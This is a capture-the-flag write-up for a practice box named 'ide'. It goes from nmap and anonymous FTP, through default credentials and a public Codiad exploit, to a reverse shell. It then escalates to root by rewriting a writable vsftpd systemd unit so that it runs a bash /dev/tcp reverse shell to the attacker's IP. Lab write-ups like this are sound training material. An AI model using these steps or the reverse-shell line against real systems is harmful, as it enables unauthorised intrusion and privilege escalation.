## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
An easy box to polish your enumeration skills!
Gain a shell on the box and escalate your privileges!
```

## IP_Address
```IP_Address
10.201.116.234
```

## RustScan
```bash
$ rustscan -a 10.201.116.234 -b 450 -t 2000 --ulimit 5000 -- -e tun0 
PORT      STATE SERVICE REASON
21/tcp    open  ftp     syn-ack ttl 60
22/tcp    open  ssh     syn-ack ttl 60
80/tcp    open  http    syn-ack ttl 60
62337/tcp open  unknown syn-ack ttl 60
```

## NMAP
```bash
nmap -sVC 10.201.116.234 -T4 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-02 20:16 EDT
Nmap scan report for 10.201.116.234
Host is up (0.25s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.36.74
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.53 seconds
```

After this I see on FTP `Anonymous` login is Allowed
```bash
$ ftp 10.201.116.234
Connected to 10.201.116.234.
220 (vsFTPd 3.0.3)
Name (10.201.116.234:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||60381|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||49440|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
226 Directory send OK.
ftp> get "-"
local: - remote: -
229 Entering Extended Passive Mode (|||22778|)
150 Opening BINARY mode data connection for - (151 bytes).
100% |*******************************************************************|   151       11.39 KiB/s    00:00 ETA
226 Transfer complete.
151 bytes received in 00:00 (0.57 KiB/s)
ftp> 
```

and in file `-`
```bash
$ cat ./-
Hey john,
I have reset the password as you have asked. Please use the default password to login. 
Also, please take care of the image file ;)
- drac.
```

which means login page is reset/ or credentials are reset on default now look for login page
by navigating `http://10.201.116.234:62337/` I found the login page and the Default Credentials are
```Credentials
john : password
```
and with login we found `Codiad 2.8.4`
and then search payload on Github
```exploit
https://github.com/BJConway/thm_writeups/blob/main/challenges/ide/codiad_exploit.py
```
and then run on terminal
```bash
 python3 new.py
```
Got the Reverse shell
```bash
$  nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.36.74] from (UNKNOWN) [10.201.118.75] 60536
/bin/sh: 0: can't access tty; job control turned off
$ $ pwd
/var/www/html
$ cd /home
$ ls
drac
$ cd drac
$ ls
user.txt
$ cat user.txt
cat: user.txt: Permission denied
$ ls -la
total 52
drwxr-xr-x 6 drac drac 4096 Aug  4  2021 .
drwxr-xr-x 3 root root 4096 Jun 17  2021 ..
-rw------- 1 drac drac   49 Jun 18  2021 .Xauthority
-rw-r--r-- 1 drac drac   36 Jul 11  2021 .bash_history
-rw-r--r-- 1 drac drac  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 drac drac 3787 Jul 11  2021 .bashrc
drwx------ 4 drac drac 4096 Jun 18  2021 .cache
drwxr-x--- 3 drac drac 4096 Jun 18  2021 .config
drwx------ 4 drac drac 4096 Jun 18  2021 .gnupg
drwx------ 3 drac drac 4096 Jun 18  2021 .local
-rw-r--r-- 1 drac drac  807 Apr  4  2018 .profile
-rw-r--r-- 1 drac drac    0 Jun 17  2021 .sudo_as_admin_successful
-rw------- 1 drac drac  557 Jun 18  2021 .xsession-errors
-r-------- 1 drac drac   33 Jun 18  2021 user.txt
$ cat .bash_historymysql -u drac -p '[password omitted]'
```

Got the User credentials/ Login using SSH
```bash
ssh drac@10.201.118.75
[password omitted]
```
Then we just checked the directory
```bash
drac@ide:~$ ls
user.txt
drac@ide:~$ cat user.txt 
[flag/hash omitted]
```
Got the user flag
```user_flag
[flag/hash omitted]
```

Then we run Find command for suid
```bash
 $ find / -perm -4000 -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/gpasswd
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
```
But it didnt lead no where so we check the Sudo Permission for the user Drac
```bash
drac@ide:~$ sudo -l
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```
And Got that it can the /usr/sbin/service vsftpd
so we check the service status
```bash
$ systemctl status vsftpd
● vsftpd.service - vsftpd FTP server
   Loaded: loaded (/lib/systemd/system/vsftpd.service; enabled; vendor preset: enabled)
   Active: active (running) since Sun 2025-08-03 02:03:15 UTC; 2min 32s ago
  Process: 807 ExecStartPre=/bin/mkdir -p /var/run/vsftpd/empty (code=exited, status=0/SUCCESS)
 Main PID: 874 (vsftpd)
    Tasks: 1 (limit: 1076)
   CGroup: /system.slice/vsftpd.service
           └─874 /usr/sbin/vsftpd /etc/vsftpd.conf
```
then checked the file permission
```bash
 ls -la /lib/systemd/system/vsftpd.service
-rw-rw-r-- 1 root drac 248 Aug  4  2021 /lib/systemd/system/vsftpd.service
```
which gives us that `drac` can edit the service file so we did 
```bash
nano /lib/systemd/system/vsftpd.service
[Unit]
Description=vsftpd FTP server
After=network.target
[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.17.36.74/4444 0>&1'
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=-/bin/mkdir -p /var/run/vsftpd/empty
[Install]
WantedBy=multi-user.target
```
we changed the ExecStart from /etc/ to reverse-shell
and then we need to update the systemctl daemon-reload
```bash
$ systemctl daemon-reload
==== AUTHENTICATING FOR org.freedesktop.systemd1.reload-daemon ===
Authentication is required to reload the systemd state.
Authenticating as: drac
Password: 
==== AUTHENTICATION COMPLETE ===
drac@ide:~$ 
```
After the `Systemctl daemon-reload` the System Status look like this 
```bash
systemctl status vsftpd
● vsftpd.service - vsftpd FTP server
   Loaded: loaded (/lib/systemd/system/vsftpd.service; enabled; vendor preset: enabled)
   Active: active (running) since Sun 2025-08-03 01:58:21 UTC; 2min 33s ago
  Process: 3048 ExecStartPre=/bin/mkdir -p /var/run/vsftpd/empty (code=exited, status=0/SUCCESS)
 Main PID: 3049 (bash)
    Tasks: 2 (limit: 1076)
   CGroup: /system.slice/vsftpd.service
           ├─3049 /bin/bash -c bash -i >& /dev/tcp/10.17.36.74/4444 0>&1
           └─3055 bash -i
```

Restart the  service its gives us the root permission reverse-shell
```bash
$ sudo /usr/sbin/service vsftpd restart
```
Got the Reverse-Shell
```bash
$ nc -lvnp 4444

listening on [any] 4444 ...
connect to [10.17.36.74] from (UNKNOWN) [10.201.118.75] 34802
bash: cannot set terminal process group (3049): Inappropriate ioctl for device
bash: no job control in this shell
root@ide:/# whoami
whoami
root
root@ide:/# cd root
cd root
root@ide:/root# ls
ls
root.txt
root@ide:/root# cat root.txt
cat root.txt
[flag/hash omitted]
```
Got the Root Flag
```ROOT_Flag
[flag/hash omitted]
```